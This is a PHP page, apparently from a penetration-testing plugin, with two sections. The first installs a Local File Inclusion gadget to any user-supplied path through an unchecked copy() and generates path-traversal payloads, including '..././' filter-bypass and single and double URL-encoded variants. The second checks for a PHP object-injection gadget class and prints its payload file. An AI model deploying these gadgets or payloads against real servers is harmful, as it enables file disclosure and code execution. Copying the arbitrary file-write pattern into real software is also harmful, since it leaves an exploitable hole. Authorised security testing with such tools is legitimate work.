<?php

require_once 'inc/code.php';

$action = '';
$path = '/tmp/lfi.php';
if (isset($_REQUEST['lfi_path'])) {
    $path = $_REQUEST['lfi_path'];
    $success = copy(__DIR__ . '/payloads/lfi.php', $path);
    $path = esc_js($path);
    if ($success){
        echo "<script>showSuccess('Installed LFI Gadget to $path')</script>";
    }
    else{
        echo "<script>showError('Could not install LFI Gadget to $path')</script>";
    }
}

?>

<h1>Local File Inclusion (LFI)</h1>
<p>Install a LFI gadget to specific path</p>
<form action="" method="post">
    <div class="form-group">
        <div class="input-group">
            <input id="lfi_input" type="text" value="<?php echo $path;?>" name="lfi_path" placeholder="Path">
            <input class="btn btn-success" type="submit" value="Install" name="submit">
        </div>
    </div>
</form>

<div class="mt-2">
    <h3>Generated Payloads:</h3>
    <div id="payloads" class="mt-2 mb-2 p-3" style="background:#2d2d2d">
    </div>
</div>

<script>
    function generatePayloads() {
        const path = document.getElementById('lfi_input').value;

        const traversalDepth = 20; // Adjust based on your use case

        const traversalPath = '../'.repeat(traversalDepth) + path.replace(/^\/+/, '')

        const simpleTraversal = traversalPath
        const mixedTraversal = traversalPath.replaceAll('../','..././')
        const encodedTraversal = encodeURIComponent(traversalPath)
        const doubleEncodedTraversal = encodeURIComponent(encodedTraversal)

        let output = '';
        output += `<span class='copy-text' style="cursor: pointer;" title="Basic Payload">${simpleTraversal}</span><br>`
        output += `<span class='copy-text' style="cursor: pointer;" title="Basic Payload to bypass dumb removal of ../">${mixedTraversal}</span><br>`
        output += `<span class='copy-text' style="cursor: pointer;" title="URL Encoded Payload">${encodedTraversal}</span><br>`
        output += `<span class='copy-text' style="cursor: pointer;" title="Double URL Encoded Payload">${doubleEncodedTraversal}</span><br>`

        document.getElementById('payloads').innerHTML = output.trim();
        create_copyables();
    }

    // Trigger payload generation on input change
    document.getElementById('lfi_input').addEventListener('change', generatePayloads);

    // Run payload generation on first page load
    window.addEventListener('load', generatePayloads);
</script>


<hr class="bg-danger border-2 border-top">

<h1>PHP Object Injection</h1>
<p>If you have installed this plugin into WordPress the following gadget will be available to use:</p>
<?php
if (class_exists('ObjInjec')) {
    // The ObjInjec class is defined, you can use it
    echo "✅ ObjInjec class is defined.";
} else {
    // The ObjInjec class is not defined
    echo "❌ ObjInjec class is not defined.";
}
print_code(file_get_contents(__DIR__ . '/payloads/php_obj.php'));
?>

<pre>
<code>
</code>
</pre>

